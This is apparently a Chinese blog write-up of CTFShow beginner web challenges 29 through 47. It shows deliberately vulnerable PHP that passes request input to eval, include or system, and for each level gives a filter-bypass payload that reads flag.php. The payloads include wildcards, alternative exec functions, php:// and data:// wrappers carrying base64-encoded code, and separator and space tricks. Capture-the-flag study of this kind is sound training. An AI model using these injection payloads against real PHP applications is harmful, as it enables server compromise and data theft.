---
title: CTFShow web入门命令执行wp
date: 2021-04-14
description: 命令执行入门
categories:
image:
author_staff_member: LunaAsuka
---

### 开始入门

## web29

```
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这道题姿势很多，为了循序渐进我不会放出特别多的payload，其他姿势请大家根据后续学习的知识自行探索。

payload：c=system("cat fla*");

使用通配符 * ，计算机会自行寻找合适的文件打开。

## web30

```
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

跟上一道题比起来多过滤了system和php两个关键字。只要不用这两个就好了。

payload：c=echo exec('cat fla*');

众所周知system()函数可以用来执行系统命令，除了它以外仍然有许多命令执行函数。

```
system()
passthru()
exec()
shell_exec()
popen()
proc_open()
pcntl_exec()
反引号 即` ` 同shell_exec() 
```

## web31

```
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这里过滤了cat，还有其他的东西。自然不用cat就好。

payload：c=echo exec('tac fla*');

```
more:一页一页的显示档案内容
less:与 more 类似 head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是
cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看 
file -f:报错出具体内容 
grep:在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如		下命令： grep test *file
```

## web32

```
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

过滤的数量逐渐变多。

 payload：?c=include $_GET["asuka"] ?>&asuka=php://filter/read=convert.base64-encode/resource=flag.php 

## web33 - 36

```
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

跟上一题没啥区别。

 payload：?c=include $_GET["asuka"]?>&asuka=php://filter/read=convert.base64-encode/resource=flag.php 

顺带一提可以使用post形式的payload。

 ?c=include$_POST[asuka]?>
 asuka=php://filter/read=convert.base64-encode/resource=flag.php 

## web37

```
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

看似过滤的只有flag，实则是文件包含，选择使用伪协议。

payload：data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==

这里使用了data伪协议，会将后续的输入当做php代码执行，由于过滤了flag，所以这里采用了base64编码进行绕过。

## web38-39

```
<?php
//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

相比上一题过滤了php和file。

payload：data://text/plain;base64, PD9waHAgc3lzdGVtKCJjYXQgZioiKTs= 

## web40

```
<?php

if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

这里过滤了许多符号，这道题可以使用无参数读取。

[无参数读取](https://www.cnblogs.com/NPFS/p/13778333.html)。首先使用 scandir(current(localeconv())) 查看当前目录所有文件名。

我们可以发现flag.php在数组的倒数第二个值里，我们可以通过 array_reverse 进行逆转数组，然后用next()函数进行下一个值的读取，成功读取flag.php文件。

payload:?c=highlight_flie(next(array_reverse(scandir(current(localeconv())))));

## web41

很难。

这里放上[大佬的wp](https://wp.ctf.show/d/137-ctfshow-web-web41)。

## web42

```
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

 **>/dev/null 2>&1**主要意思是不进行回显的意思 。

我们要让命令回显，那么进行命令分隔即可

;	//分号
|	//只执行后面那条命令
||	//只执行前面那条命令
&	//两条命令都会执行
&&	//两条命令都会执行

payload：cat flag.php;

webpayload:   cat flag.php||

## web43

多过滤了cat和分号。换一个就好。

 payload:  tac%20flag.php%0a

## web44

多过滤一个flag，通配符解决。

 payload:  tac%20fla*%0a

## web45

 多过滤了一个空格，众所周知php环境下可以用`%09`代替空格。

 payload:  tac%09fla*%0a

```
>` `<` `<>` 重定向符
`%09`(需要php环境)
`${IFS}`
`$IFS$9`
`{cat,flag.php}` //用逗号实现了空格功能
`%20`
`%09
```

空格绕过

## web46

过滤了数子，$，*等，通配符可以使用？问号，空格可用%09

payload: ?c=sort%09fl?g.php||

## web47

又过滤了些别的。

 payload: ?c=tac%09fl?g.php|| 



